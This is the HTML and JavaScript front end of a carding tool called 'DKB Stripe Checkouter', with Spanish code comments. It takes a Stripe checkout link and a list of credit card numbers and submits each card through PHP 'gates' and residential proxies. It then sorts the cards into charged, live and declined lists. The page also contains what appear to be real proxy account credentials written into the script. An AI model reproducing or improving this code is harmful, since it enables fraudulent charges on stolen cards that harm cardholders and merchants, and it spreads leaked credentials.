<!DOCTYPE html>
<html class="loading">
  <head>
	  <!-- Establece la codificación de caracteres del documento -->
	  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	  <!-- Establece la compatibilidad con Internet Explorer -->
	  <meta http-equiv="X-UA-Compatible" content="IE=edge">
	  <!-- Establece el viewport, el zoom inicial y la posibilidad de hacer zoom en dispositivos móviles -->
	  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">    
	  <!-- Establece el título de la página -->
	  <title>DKB Stripe Checkouter</title>
	  <!-- Establece el ícono de la página (logo) -->
	  <link rel="icon" href="icon8/stripe-icon.png">
	  <!-- Carga las fuentes de Google Fonts -->
	  <link href="https://fonts.googleapis.com/css?family=Muli:300,300i,400,400i,600,600i,700,700i%7CComfortaa:300,400,700" rel="stylesheet">
	  <!-- Carga la fuente Orbitron de Google Fonts -->
      <link href="https://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet">
	  <!-- Carga los iconos de Font Awesome -->
	  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
	  <!-- Carga los estilos del tema -->
	  <link rel="stylesheet" type="text/css" href="theme-assets/css/vendors.css">
	  <link rel="stylesheet" type="text/css" href="theme-assets/css/app-lite.css">
	  <link rel="stylesheet" type="text/css" href="theme-assets/css/core/menu/menu-types/vertical-menu.css">
	  <link rel="stylesheet" type="text/css" href="theme-assets/css/core/colors/palette-gradient.css">
	  <!-- Carga la biblioteca SweetAlert 2 -->
	  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
	  
  </head>
  
  <script>
	  // Esta función se ejecuta cuando se envía el formulario
	  function submitForm(event) {
		  // Previene el comportamiento predeterminado del evento de envío del formulario
		  event.preventDefault();
  
		  // Obtiene el valor del campo 'checkoutlink' del formulario
		  const checkoutLink = document.getElementById('checkoutlink').value;
  
		  // Realiza una solicitud fetch a 'process_form.php' mediante el método POST
		  fetch('process_form.php', {
			  method: 'POST',
			  headers: {
				  // Establece el tipo de contenido de la solicitud como URL codificada
				  'Content-Type': 'application/x-www-form-urlencoded',
			  },
			  // Convierte los datos del formulario en una cadena de consulta URL codificada
			  body: new URLSearchParams({
				  checkoutlink: checkoutLink
			  }),
		  })
		  // Convierte la respuesta en un objeto JSON
		  .then((response) => response.json())
		  // Procesa los datos recibidos en el objeto JSON
		  .then((data) => {
			  // Si 'cslive' está presente en los datos, establece su valor en el campo correspondiente; de lo contrario, deja el campo vacío
			  document.querySelector('#cslive').value = data.cslive ?? '';
			  // Si 'email' está presente en los datos, establece su valor en el campo correspondiente; de lo contrario, deja el campo vacío
			  document.querySelector('#email').value = data.email ?? '';
			  // Si 'pklive' está presente en los datos, establece su valor en el campo correspondiente; de lo contrario, establece 'pk_live not found'
			  document.querySelector('#pklive').value = data.pklive ?? 'pk_live not found';
			  // Si 'ip' está presente en los datos, establece su valor en el campo correspondiente; de lo contrario, deja el campo vacío
			  document.querySelector('#ip').value = data.ip ?? '';
			  // Si 'port' está presente en los datos, establece su valor en el campo correspondiente; de lo contrario, deja el campo vacío
			  document.querySelector('#port').value = data.port ?? '';
		  });
	  }
  </script>
  
<body class="vertical-layout" style="background-color:#000000;" data-color="bg-gradient-x-purple-blue">   
  <style>
	  /* Aplicar la fuente Orbitron al contenido del cuerpo */
      body {
          font-family: 'Orbitron', sans-serif;
      }

	  /* Estilos para los elementos h5 y h4 */
	  h5, h4 {
		  color: white;
	  }
  
	  /* Estilos para elementos con la clase .text-center */
	  .text-center {
		  background-color: #000000;
		  border: 1px solid;
		  border-color: #18d6a3;
		  border-radius: 15px;
		  font-family: 'Orbitron', sans-serif;
		  letter-spacing: 2px;
	  }
  
	  /* Estilos para elementos textarea */
	  textarea {
		  color: white;
		  resize: none;
		  border: 1px white solid;
	  }
  
	  /* Estilos para el texto de marcador de posición en elementos .text-center */
	  .text-center::placeholder {
		  color: grey;
	  }
  
	  /* Estilos para elementos .text-center cuando están enfocados */
	  .text-center:focus {
		  background-color: #000000;
		  border: 1px solid black;
		  transition: 0.5s;
	  }
  
	  /* Estilos para la barra de desplazamiento en elementos textarea */
	  textarea::-webkit-scrollbar {
		  width: 2px;
		  background-color: #112132;
	  }
  
	  /* Estilos para el pulgar de la barra de desplazamiento en elementos textarea */
	  textarea::-webkit-scrollbar-thumb {
		  border-radius: 10px;
		  background-color: #2e4964;
	  }
  
	  /* Estilos para elementos con la clase .lista_reprovadass */
	  .lista_reprovadass {
		  color: #747474;
	  }
  
	  /* Estilos para elementos con la clase .card-body */
	  .card-body {
		  background-color: black;
		  border: 1px solid;
		  border-color: #2e2e2e;
		  border-radius: 15px;
	  }
  
	  /* Estilos para elementos con la clase .text-center */
	  .text-center {
		  background-color: black;
		  border: 1px solid;
		  border-color: #1a1a1a;
		  border-radius: 15px;
		  box-shadow: 5px #18d6a3;
	  }
  
	  /* Estilos para elementos con las clases .badge-success y .btn-success */
	  .badge-success, .btn-success {
		  background-color: #5ed84f;
		  color: black;
		  border: none;
	  }
  
	  /* Estilos para elementos con la clase .btn-success en estado hover */
	  .btn-success:hover {
		  background-color: #28af17;
		  border: none;
		  color: black;
		  shadow: hidden;
	  }
  
	  /* Estilos para elementos con la clase .aprovadas */
	  .aprovadas {
		  background-color: #35a7ff;
		  color: black;
	  }
  
	  /* Estilos para elementos con la clase .badge-danger */
	  .badge-danger {
		  background-color: #ff1b23;
		  color: black;
	  }
  
	  /* Estilos para elementos en la ruta .html body .content .content-wrapper */
	  .html body .content .content-wrapper {
		  background-color: #112132;
	  }
  

	  /* Estilos para elementos con la clase .statusbar */
	  .statusbar {
		  height: 320px;
		  padding-top: 50px;
	  }
  
	  /* Estilos para elementos con la clase .hr-statusbar */
	  .hr-statusbar {
		  border: none;
		  height: 0.5px;
		  background-image: linear-gradient(to right, #000000, #000000);
	  }
  
	  /* Estilos para elementos con la clase .footer-C */
	  .footer-C {
		  background-color: #1f1f29;
		  color: white;
		  text-align: center;
		  font-family: 'Orbitron', sans-serif;
		  font-size: 17px;
		  letter-spacing: 1px;
	  }
  </style>
  
	<button id="startButton">Iniciar verificación sonido</button>
    <div class="app-content content" style="display:block;">
		<div class="content-wrapper" style="background-color:#000000;">
			<div class="text-center" style="background-color:#000000;">
				<!-- Título -->
				<h4 class="mb-2"><strong>DKB Stripe Checkouter</strong></h4>
				<!-- Contador de resultados -->
				<div class="form-group">
					<strong>CHARGED : </strong><span class="badge badge-success charge">0</span>
					<strong>LIVE : </strong><span class="badge badge-primary aprovadas"> 0</span>
					<strong>DEAD : </strong><span class="badge badge-danger reprovadas"> 0</span>
					<strong>TOTAL : </strong><span class="badge badge-dark carregadas"> 0</span>
				</div>
				<!-- Formulario para ingresar el enlace de pago -->
				<form autocomplete="off" onsubmit="submitForm(event)">
					<input type="text" style="background-color:#00000;" class="form-control text-center" id="checkoutlink" name="checkoutlink" style="width: 100%;" placeholder="Paste your checkout link">
					<button class="btn btn-submit btn-bg-black text-white" style="background-color:#000000; width: 100%;"><i class="fa fa-submit"></i>PARSE</button>
				</form>
			</div>
			<div class="content-body">
				<div class="mt-2"></div>
				<div class="row">
					<div class="col-md-12">
						<div class="card" style="background-color:transparent;">
							<div class="card-body text-center">
								<!-- Área de texto para ingresar las tarjetas de crédito -->
								<textarea rows="6" class="form-control text-center form-checker mb-2" placeholder="PUT YOUR CC HERE :>"></textarea>
								<!-- Selector de puertas -->
								<div class="mb-1">
									<div class="input-group">
										<select name="gates" id="gates" class="form-control text-white gates" style="margin-bottom: 5px; background-color: #000000;">
											<option class="form-control" style="background-color: #000000;" value="new-co.php">Auto Checkout NO ADDRESS GATE </option>
											<option class="form-control" style="background-color: #000000;" value="new-co-chatgpt.php">Auto Checkout CHATGPT Gate</option>
										</select>
									</div>
								</div>
								<!-- Campos para ingresar información adicional -->
								<div class="input-group mb-1">
									<input type="text" style="background-color:#000000;" class="form-control" id="cslive" placeholder="CS_LIVE" name="cslive">&nbsp;
									<input type="text" style="background-color:#000000;" class="form-control" id="pklive" placeholder="PK_LIVE" name="pklive">
									<input type="text" style="background-color:#000000;" class="form-control" id="email" placeholder="EMAIL" name="email">
								</div>
								<!-- Selector de proxy -->
								<div class="mb-1">
									<div class="input-group">
										<select class="form-control text-white" id="proxySelector" style="margin-bottom: 5px; background-color: #000000;">
											<option name="proxy" id="proxy" class="form-control" style="background-color: #000000;">Proxy: </option>
											<option name="proxy1" id="proxy1" class="form-control" style="background-color: #000000;">Proxy Geoneode </option>
											<option name="proxy2" id="proxy2" class="form-control" style="background-color: #000000;">Proxy Pingproxy</option>
										</select>
									</div>
								</div>
								<!-- Campos para ingresar el proxy y la contraseña -->
								<div class="input-group mb-1">
									<input type="text" style="background-color:#000000;" class="form-control" id="ip" placeholder="Enter Proxy:Port Here" name="ip">&nbsp;
									<input type="text" style="background-color:#000000;" class="form-control" id="port" placeholder="Enter Proxy Password Here" name="port">
								</div>
								
								<script>
								document.getElementById('proxySelector').addEventListener('change', function() {
									const ipInput = document.getElementById('ip');
									const portInput = document.getElementById('port');
									if (this.selectedIndex === 0) {
										ipInput.value = '';
										portInput.value = '';
									} else if (this.selectedIndex === 1) {
										ipInput.value = 'premium-residential.geonode.com:9000';
										portInput.value = 'geonode_1uRNvl6p2p:e67d351f-0a13-4b58-9626-4c9f4ad86d19';
									} else if (this.selectedIndex === 2) {
										ipInput.value = 'residential.pingproxies.com:7777';
										portInput.value = 'customer-847ac783WaqQ84:Pp1erei96q';
									} else {
										ipInput.value = '';
										portInput.value = '';
									}
								});
								</script>
								
								<!-- Botones para iniciar y detener el proceso -->
								<button class="btn btn-play btn-glow btn-bg-gradient-x-blue-cyan text-white" style="width: 49%; float: left;"><i class="fa fa-play"></i>START</button>
								<button class="btn btn-stop btn-glow btn-bg-gradient-x-red-pink text-white" style="width: 49%; float: right;" disabled><i class="fa fa-stop"></i>STOP</button>
							</div>
						</div>
					</div>
					<!-- Sección de tarjetas cargadas -->
					<div class="col-xl-12">
						<div class="card" style="background-color:transparent;">
							<div class="card-body">
								<div class="float-right">
									<button type="show" class="btn btn-primary btn-sm show-charge"><i class="fa fa-eye-slash"></i></button>
									<button class="btn btn-success btn-sm btn-copy1"><i class="fa fa-copy"></i></button>
								</div>
								<h4 class="card-title mb-1"><i class="fa fa-check-circle text-success"></i> CHARGED <span class="badge badge-success charge">0</span></h4>
								<div id='cards_charge'></div>
							</div>
						</div>
					</div>
					<!-- Sección de tarjetas aprobadas -->
					<div class="col-xl-12">
						<div class="card" style="background-color:transparent;">
							<div class="card-body">
								<div class="float-right">
									<button type="show" class="btn btn-primary btn-sm show-lives"><i class="fa fa-eye-slash"></i></button>
									<button class="btn btn-success btn-sm btn-copy"><i class="fa fa-copy"></i></button>
								</div>
								<h4 class="card-title mb-1"><i class="fa fa-check text-success"></i> CVV/CCN <span class="badge badge-success aprovadas">0</span></h4>
								<div id='cards_aprovadas'></div>
							</div>
						</div>
					</div>
					<!-- Sección de tarjetas rechazadas -->
					<div class="col-xl-12">
						<div class="card" style="background-color:transparent;">
							<div class="card-body">
								<div class="float-right">
									<button type='hidden' class="btn btn-primary btn-sm show-dies"><i class="fa fa-eye"></i></button>
									<button class="btn btn-danger btn-sm btn-trash"><i class="fa fa-trash"></i></button>
								</div>
								<h4 class="card-title mb-1"><i class="fa fa-times text-danger"></i> DECLINED <span class="badge badge-danger reprovadas">0</span></h4>
								<div style='display: none;' id='cards_reprovadas'></div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	
 
	<script src="theme-assets/js/core/libraries/jquery.min.js" type="text/javascript"></script>

	<script>
		$(document).ready(function () {
			// Swal.fire({
			//     title: "Dynamic DR Flash",
			//     text: "DDRF Auto Checkouter",
			//     icon: "warning",
			//     confirmButtonText: "OK",
			//     buttonsStyling: false,
			//     confirmButtonClass: 'btn btn-primary'
			// });

			//Mostrar/ocultar tarjetas cargadas
			$('.show-charge').click(function () {
				var type = $('.show-charge').attr('type');
				$('#cards_charge').slideToggle();

				if (type == 'show') {
					$('.show-charge').html('<i class="fa fa-eye"></i>');
					$('.show-charge').attr('type', 'hidden');
				} else {
					$('.show-charge').html('<i class="fa fa-eye-slash"></i>');
					$('.show-charge').attr('type', 'show');
				}
			});

			//Mostrar/ocultar tarjetas aprobadas
			$('.show-lives').click(function () {
				var type = $('.show-lives').attr('type');
				$('#cards_aprovadas').slideToggle();

				if (type == 'show') {
					$('.show-lives').html('<i class="fa fa-eye"></i>');
					$('.show-lives').attr('type', 'hidden');
				} else {
					$('.show-lives').html('<i class="fa fa-eye-slash"></i>');
					$('.show-lives').attr('type', 'show');
				}
			});

			//Mostrar/ocultar tarjetas rechazadas
			$('.show-dies').click(function () {
				var type = $('.show-dies').attr('type');
				$('#cards_reprovadas').slideToggle();

				if (type == 'show') {
					$('.show-dies').html('<i class="fa fa-eye"></i>');
					$('.show-dies').attr('type', 'hidden');
				} else {
					$('.show-dies').html('<i class="fa fa-eye-slash"></i>');
					$('.show-dies').attr('type', 'show');
				}
			});

			//Eliminar tarjetas muertas
			$('.btn-trash').click(function () {
				Swal.fire({
					title: 'REMOVE CC DEAD SUCCESS',
					icon: 'success',
					showConfirmButton: false,
					toast: true,
					position: 'top-end',
					timer: 3000
				});
				$('#cards_reprovadas').text('');
			});

			//Copiar tarjetas cargadas
			$('.btn-copy1').click(function () {
				Swal.fire({
					title: 'COPY CC CHARGED SUCCESS',
					icon: 'success',
					showConfirmButton: false,
					toast: true,
					position: 'top-end',
					timer: 3000
				});

				var cards_charge = document.getElementById('cards_charge').innerText;
				var textarea = document.createElement("textarea");
				textarea.value = cards_charge;
				document.body.appendChild(textarea);
				textarea.select();
				document.execCommand('copy');
				document.body.removeChild(textarea);
			});

			//Copiar tarjetas aprobadas
			$('.btn-copy').click(function () {
				Swal.fire({
					title: 'COPY CC LIVE SUCCESS',
					icon: 'success',
					showConfirmButton: false,
					toast: true,
					position: 'top-end',
					timer: 3000
				});

				var cards_lives = document.getElementById('cards_aprovadas').innerText;
				var textarea = document.createElement("textarea");
				textarea.value = cards_lives;
				document.body.appendChild(textarea);
				textarea.select();
				document.execCommand('copy');
				document.body.removeChild(textarea);
			});

			// Inicio de la verificación de tarjetas
			$('.btn-play').click(function () {
				// Obteniendo los valores de los campos
				var cards = $('.form-checker').val().trim();
				var array = cards.split('\n');
				var pklive = $("#pklive").val().trim();
				var cslive = $("#cslive").val().trim();
				var email = $("#email").val().trim();
				var ip = $("#ip").val().trim();
				var port = $("#port").val().trim();
			
				var charge = 0, lives = 0, dies = 0, testadas = 0, txt = '';
			
				var whichgate = document.getElementById('gates').value;
			
				// Verificación de campos vacíos
				if (!cards) {
					Swal.fire({
						title: '¿Dónde está tu tarjeta? Por favor, añade una tarjeta!',
						icon: 'error',
						showConfirmButton: false,
						toast: true,
						position: 'top-end',
						timer: 3000
					});
					return false;
				}
				if (!pklive) {
					Swal.fire({
						title: '¿Dónde está tu pklive? Por favor, añade un pklive!',
						icon: 'error',
						showConfirmButton: false,
						toast: true,
						position: 'top-end',
						timer: 3000
					});
					return false;
				}
				if (!cslive) {
					Swal.fire({
						title: '¿Dónde está tu cslive? Por favor, añade un cslive!',
						icon: 'error',
						showConfirmButton: false,
						toast: true,
						position: 'top-end',
						timer: 3000
					});
					return false;
				}
				if (!email) {
					Swal.fire({
						title: 'Por favor, ingresa tu correo electrónico',
						icon: 'error',
						showConfirmButton: false,
						toast: true,
						position: 'top-end',
						timer: 3000
					});
					return false;
				}
			
				// Mensaje de espera
				Swal.fire({
					title: 'Por favor, espera a que se procese la tarjeta!',
					icon: 'success',
					showConfirmButton: false,
					toast: true,
					position: 'top-end',
					timer: 3000
				});
			
				// Filtrar las líneas
				var line = array.filter(function (value) {
					if (value.trim() !== "") {
						txt += value.trim() + '\n';
						return value.trim();
					}
				});
			
				var total = line.length;
				$('.form-checker').val(txt.trim());
			
				// Límite de tarjetas
				if (total > 10000) {
					Swal.fire({
						title: 'LÍMITE DE 50 TARJETAS SOLAMENTE',
						icon: 'warning',
						showConfirmButton: false,
						toast: true,
						position: 'top-end',
						timer: 3000
					});
					return false;
				}
			
				// Actualizar información en la pantalla
				$('.carregadas').text(total);
				$('.btn-play').attr('disabled', true);
				$('.btn-stop').attr('disabled', false);
			
				// Procesar cada tarjeta
				line.every(function (data, index) {
					setTimeout(function () {
						var callBack = $.ajax({
							url: whichgate + '?cards=' + data + '&cslive=' + cslive + '&email=' + email + '&pklive=' + pklive + '&ip=' + ip + '&port=' + port + '&referrer=Auth',
							success: function (retorno) {
								// Analizar el resultado y actualizar la información en la pantalla
								if (retorno.indexOf("#CHARGED") >= 0) {
									Swal.fire({
										title: '+1 TARJETA CARGADA',
										icon: 'success',
										showConfirmButton: false,
										toast: true,
										position: 'top-end',
										timer: 3000
									});
									$('#cards_charge').append(retorno);
									removelinha();
									charge = charge + 1;
								} else if (retorno.indexOf("#LIVE") >= 0) {
									Swal.fire({
										title: '+1 TARJETA VIVA',
										icon: 'success',
										showConfirmButton: false,
										toast: true,
										position: 'top-end',
										timer: 3000
									});
									$('#cards_aprovadas').append(retorno);
									removelinha();
									lives = lives + 1;
								} else {
									$('#cards_reprovadas').append(retorno);
									removelinha();
									dies = dies + 1;
								}
			
								// Actualizar información en la pantalla
								testadas = charge + lives + dies;
								$('.charge').text(charge);
								$('.aprovadas').text(lives);
								$('.reprovadas').text(dies);
								$('.testadas').text(testadas);
			
								// Proceso finalizado
								if (testadas == total) {
									Swal.fire({
										title: 'SE HAN DESECHADO',
										icon: 'success',
										showConfirmButton: false,
										toast: true,
										position: 'top-end',
										timer: 3000
									});
									$('.btn-play').attr('disabled', false);
									$('.btn-stop').attr('disabled', true);
								}
							}
						});
					}, 10000 * index);
					return true;
				});
			});
			

			//Eliminar línea de tarjetas
			function removelinha() {
				var lines = $('.form-checker').val().split('\n');
				lines.splice(0, 1);
				$('.form-checker').val(lines.join("\n"));
			}
		});
	</script>


</body>
</html>